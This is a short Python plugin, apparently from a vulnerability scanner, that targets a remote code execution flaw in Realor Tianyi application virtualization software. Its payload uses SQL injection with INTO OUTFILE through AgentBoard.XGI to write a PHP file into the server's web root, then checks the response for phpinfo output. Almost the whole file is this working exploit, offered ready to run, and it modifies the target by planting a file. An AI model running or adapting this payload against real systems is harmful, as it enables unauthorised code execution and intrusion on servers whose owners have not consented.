#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {}
  ret['links'] = ''
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "瑞友天翼应用虚拟化远程代码执行漏洞"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['auhor'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  payload="/AgentBoard.XGI?cmd=UserLogin&user=../../../../../../../../../../../../../../../../../../Windows/win.ini'||'1'+LIMIT+0,1+INTO+OUTFILE+'C:/RealFriend/Rap+Server/WebRoot/test.php'+LINES+TERMINATED+BY+0x3c3f70687020706870696e666f28293b3f3e--+-"
  url1 = url + payload
  ret['url'] = url1
  try:
    res=requests.get(url=url1,timeout=5)
    if res.status_code == 200 and "phpinfo()" in res.text:
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret